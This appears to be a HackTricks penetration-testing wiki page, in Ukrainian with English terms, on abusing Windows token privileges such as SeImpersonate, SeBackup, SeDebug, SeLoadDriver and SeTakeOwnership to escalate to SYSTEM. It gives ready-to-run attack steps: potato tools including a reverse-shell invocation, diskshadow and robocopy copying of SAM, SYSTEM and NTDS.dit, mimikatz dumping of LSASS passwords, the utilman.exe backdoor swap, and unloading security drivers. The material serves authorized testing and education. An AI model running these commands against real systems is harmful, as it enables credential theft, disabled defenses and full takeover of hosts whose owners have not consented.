# Зловживання Token-ами

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Якщо ви **не знаєте, що таке Windows Access Tokens**, прочитайте цю сторінку перед продовженням:


{{#ref}}
access-tokens.md
{{#endref}}

**Можливо, ви зможете підвищити привілеї, зловживаючи token-ами, які вже маєте**

### SeImpersonatePrivilege

Це privilege, яке має будь-який process, що дозволяє impersonation (але не creation) будь-якого token-а, за умови, що до нього можна отримати handle. Privileged token можна отримати з Windows service (DCOM), спровокувавши його виконати NTLM authentication проти exploit-а, що згодом дає змогу виконати process з SYSTEM privileges. Цю vulnerability можна експлуатувати за допомогою різних tool-ів, таких як [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (який вимагає, щоб winrm був disabled), [SweetPotato](https://github.com/CCob/SweetPotato) і [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Modern operator notes:

- **JuicyPotato is legacy**: на Windows 10 1809+/Server 2019+ краще використовувати **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** або **PrintSpoofer** залежно від того, яка RPC/COM surface все ще reachable.
- Якщо ви скомпрометували service, що працює як **`LOCAL SERVICE`** або **`NETWORK SERVICE`**, і `whoami /priv` показує **filtered token** без `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, спочатку відновіть **default privilege set** цього account (наприклад, за допомогою **FullPowers**), а потім повторіть potato family.
- Деякі новіші fork-и зручніші для operator-а, ніж оригінальні tools. Наприклад, **SigmaPotato** додає reflection/in-memory execution і сучасну сумісність із Windows, а **PrintNotifyPotato** зловживає PrintNotify COM service і часто корисний, коли classic Spooler path disabled.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Це дуже схоже на **SeImpersonatePrivilege**, воно використовуватиме **той самий метод** для отримання привілейованого token.\
Потім ця privilege дозволяє **призначити primary token** новому/призупиненому процесу. З привілейованим impersonation token можна похідно отримати primary token (DuplicateTokenEx).\
За допомогою token можна створити **новий процес** через 'CreateProcessAsUser' або створити процес у suspended стані й **встановити token** (загалом, ви не можете змінити primary token процесу, що вже працює).

### SeTcbPrivilege

Якщо у вас увімкнено цей token, ви можете використати **KERB_S4U_LOGON** для отримання **impersonation token** для будь-якого іншого користувача без знання credentials, **додати довільну group** (admins) до token, встановити **integrity level** token на "**medium**" і призначити цей token **поточному thread** (SetThreadToken).

### SeBackupPrivilege

Ця privilege змушує систему **надавати всі права читання** до будь-якого файлу (лише для операцій читання). Її використовують для **читання password hashes локальних Administrator** accounts із registry, після чого можна використовувати tools на кшталт "**psexec**" або "**wmiexec**" з hash (Pass-the-Hash technique). Однак ця technique не спрацьовує за двох умов: коли Local Administrator account вимкнено, або коли діє policy, що забирає administrative rights у Local Administrators, які підключаються remotely.\
На практиці найнадійніший вбудований workflow зазвичай — це **VSS + `robocopy /b`**: створити/відкрити shadow copy, а потім скопіювати `SAM`/`SYSTEM` або `NTDS.dit` у **backup mode**, що обходить file ACLs.
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
You can **abuse this privilege** with:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- following **IppSec** in [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Or as explained in the **escalating privileges with Backup Operators** section of:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Дозвіл на **write access** до будь-якого системного файлу, незалежно від Access Control List (ACL) файлу, надається цим привілеєм. Він відкриває численні можливості для escalation, включно зі здатністю **modify services**, виконувати DLL Hijacking і встановлювати **debuggers** через Image File Execution Options, серед інших технік.

### SeCreateTokenPrivilege

SeCreateTokenPrivilege — це потужний дозвіл, особливо корисний, коли користувач має можливість impersonate tokens, але також і за відсутності SeImpersonatePrivilege. Ця можливість ґрунтується на здатності impersonate token, що представляє того самого користувача і чий integrity level не перевищує рівень поточного процесу.

**Key Points:**

- **Impersonation without SeImpersonatePrivilege:** Можливо використати SeCreateTokenPrivilege для EoP шляхом impersonate tokens за певних умов.
- **Conditions for Token Impersonation:** Успішний impersonation вимагає, щоб target token належав тому самому користувачу і мав integrity level, що менший або дорівнює integrity level процесу, який намагається виконати impersonation.
- **Creation and Modification of Impersonation Tokens:** Користувачі можуть створити impersonation token і посилити його, додавши SID (Security Identifier) привілейованої групи.

### SeLoadDriverPrivilege

Цей привілеї дозволяє **load and unload device drivers** шляхом створення запису в реєстрі зі специфічними значеннями `ImagePath` і `Type`. Оскільки прямий write access до `HKLM` (HKEY_LOCAL_MACHINE) обмежений, натомість потрібно використовувати `HKCU` (HKEY_CURRENT_USER). Однак, щоб зробити `HKCU` розпізнаваним ядром для налаштування driver, необхідно дотримуватися певного шляху.

Modern offensive use is usually **BYOVD** (bring your own vulnerable driver): load a **signed but vulnerable** kernel driver and then use its IOCTLs to disable protections or jump to kernel code execution. Keep in mind that on recent Windows 11/Server builds the **Microsoft vulnerable driver blocklist** and/or **HVCI/Memory Integrity** often break older public chains, so the classic `szkg64.sys`-style examples are no longer universally reliable.

Цей шлях: `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, where `<RID>` is the Relative Identifier of the current user. Усередині `HKCU` весь цей шлях має бути створений, і потрібно встановити два значення:

- `ImagePath`, which is the path to the binary to be executed
- `Type`, with a value of `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Steps to Follow:**

1. Access `HKCU` instead of `HKLM` due to restricted write access.
2. Create the path `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` within `HKCU`, where `<RID>` represents the current user's Relative Identifier.
3. Set the `ImagePath` to the binary's execution path.
4. Assign the `Type` as `SERVICE_KERNEL_DRIVER` (`0x00000001`).
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Більше способів зловживати цим privilege у [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Це схоже на **SeRestorePrivilege**. Його основна функція дозволяє process **прийняти ownership об'єкта**, обходячи вимогу явного discretionary access через надання WRITE_OWNER access rights. Процес полягає спочатку в отриманні ownership цільового registry key для цілей запису, а потім у зміні DACL, щоб увімкнути write operations.
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

Це privilege дозволяє **debug other processes**, включно з читанням і записом у пам’ять. Із цим privilege можна застосовувати різні стратегії memory injection, здатні обходити більшість antivirus та host intrusion prevention рішень.

На сучасних Windows пам’ятайте, що `SeDebugPrivilege` зазвичай достатньо, щоб відкрити **non-protected SYSTEM processes** і дублювати їхні token, але це **не** гарантія, що ви зможете торкнутися **LSASS**. Якщо увімкнено **RunAsPPL / LSA Protection**, non-protected processes не можуть читати або inject у LSASS навіть за наявності `SeDebugPrivilege`. У такому разі вкрадіть token з іншого non-PPL SYSTEM process або поєднайте це з PPL bypass/BYOVD замість того, щоб припускати, що `procdump` спрацює. Повний приклад копіювання token за допомогою `SeDebugPrivilege` + `SeImpersonatePrivilege` дивіться на [this page](sedebug-+-seimpersonate-copy-token.md).

#### Dump memory

Ви можете використати [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) із [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite), щоб **capture the memory of a process**. Зокрема, це можна застосувати до процесу **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, який відповідає за зберігання user credentials після того, як користувач успішно увійшов у систему.

Потім ви можете завантажити цей dump у mimikatz, щоб отримати passwords:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

If you want to get a `NT SYSTEM` shell you could use:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

Це право (Perform volume maintenance tasks) дозволяє відкривати raw volume device handles (наприклад, \\.\C:) для прямого disk I/O, що обходить NTFS ACLs. З ним можна копіювати байти будь-якого файлу на томі, читаючи базові блоки, що дає змогу виконувати arbitrary file read чутливих даних (наприклад, machine private keys у %ProgramData%\Microsoft\Crypto\, registry hives, SAM/NTDS через VSS). Це особливо впливає на CA servers, де exfiltrating CA private key дає змогу forge Golden Certificate для impersonate будь-якого principal.

Див. детальні techniques і mitigations:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{endref}}

## Check privileges
```
whoami /priv
```
Ті **tokens, що відображаються як Disabled**, зазвичай можна увімкнути, тож часто можна abuse як _Enabled_, так і _Disabled_ привілеї.

### Enable All the tokens

Якщо у вас є disabled привілеї, ви можете використати скрипт [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1), щоб увімкнути всі tokens:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Або **script**, вбудований у цьому [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Table

Повний cheatsheet привілеїв token тут: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), нижче наведено лише прямі способи використати привілей для отримання admin session або читання sensitive files.

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| ------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"_                                                                                                                                                                                                      | Дякую [Aurélien Chalot](https://twitter.com/Defte_) за оновлення. Я спробую незабаром перефразувати це у більш recipe-like вигляді.                                                                                                                                                                                         |
| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | Читайте sensitive files за допомогою `robocopy /b` або спеціалізованих helper-ів, що підтримують SeBackup.                                                                                                                                                                                                                                         | <p>- Чудово підходить для `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, а інколи й `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` зручний, але спеціалізовані SeBackup cmdlets/APIs часто гнучкіші для locked/open files.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | Створюйте arbitrary token, включно з local admin rights, за допомогою `NtCreateToken`.                                                                                                                                                                                                                                                            |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Duplicate a **non-PPL** SYSTEM token або dump memory з non-protected process.                                                                                                                                                                                                                                                                     | <p>LSASS dumping зазвичай блокується, якщо увімкнено RunAsPPL/LSA Protection.</p><p>Script можна знайти тут: [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | Використайте **Potato family** / named-pipe impersonation, щоб запустити SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, тощо).                                                                                                                                                                        | <p>Найпрактичніше з service accounts, таких як IIS APPPOOL, MSSQL, scheduled tasks, або будь-якого context, який уже має `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. Завантажте signed-but-vulnerable kernel driver (BYOVD)<br>2. Використайте IOCTLs драйвера, щоб отримати kernel R/W, вимкнути security tooling або підвищити привілеї до SYSTEM<br><br>Альтернативно, privilege можна використати, щоб вивантажити security-related drivers за допомогою вбудованої команди <code>fltMC</code>, тобто <code>fltMC sysmondrv</code></p>                     | <p>Старі public drivers, такі як <code>szkg64.sys</code>, дедалі частіше блокуються в modern Windows через vulnerable-driver blocklist / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Запустіть PowerShell/ISE із присутнім privilege SeRestore.<br>2. Увімкніть privilege за допомогою <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Перейменуйте utilman.exe на utilman.old<br>4. Перейменуйте cmd.exe на utilman.exe<br>5. Заблокуйте консоль і натисніть Win+U</p> | <p>Attack може бути виявлена деяким AV software.</p><p>Alternative method базується на заміні service binaries, що зберігаються в "Program Files", використовуючи той самий privilege</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Перейменуйте cmd.exe на utilman.exe<br>4. Заблокуйте консоль і натисніть Win+U</p>                                                                                                                                       | <p>Attack може бути виявлена деяким AV software.</p><p>Alternative method базується на заміні service binaries, що зберігаються в "Program Files", використовуючи той самий privilege.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>Маніпулюйте tokens так, щоб було включено local admin rights. May require SeImpersonate.</p><p>Потрібно перевірити.</p>                                                                                                                                                                                                                         |                                                                                                                                                                                                                                                                                                                                |

## References

- Подивіться на цю table, що визначає Windows tokens: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)
- Подивіться на [**this paper**](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt) про privesc with tokens.
- itm4n – Give Me Back My Privileges! Please? (restricted service tokens / FullPowers): https://itm4n.github.io/localservice-privileges/
- Microsoft – Robocopy (`/b` backup mode bypasses file/folder ACL checks): https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
- Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege): https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks
- 0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate): https://0xdf.gitlab.io/2025/10/04/htb-certificate.html

{{#include ../../banners/hacktricks-training.md}}
